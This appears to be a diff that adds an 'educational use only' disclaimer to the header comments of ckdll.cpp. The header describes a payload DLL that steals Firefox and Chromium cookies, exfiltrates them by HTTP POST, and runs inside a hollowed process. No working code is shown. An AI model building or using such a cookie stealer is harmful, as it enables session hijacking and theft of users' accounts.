@@ -1,6 +1,12 @@
 // ckdll.cpp - payload DLL: extracts cookies (Firefox plaintext + Chromium v10/v11/v20)
 //   and exfiltrates them as Cookie-Editor JSON via HTTP POST (Winsock2) or local fallback.
 //
+//   EDUCATIONAL USE ONLY -- FOR SECURITY RESEARCH AND TRAINING
+//
+//   This is offensive security tooling for penetration testing, red-team exercises,
+//   and security education. Only use on systems you own or are explicitly authorized
+//   to test. Unauthorized use is illegal. The authors are not responsible for misuse.
+//
 // CRT-less: /NODEFAULTLIB /ENTRY:payload_entry /DYNAMICBASE:NO /BASE:0x5F000000
 // Optimizer off (/Od /Oi-): SSE-vectorized memcpy/memset crashes in hollowed process.
 #define WIN32_LEAN_AND_MEAN
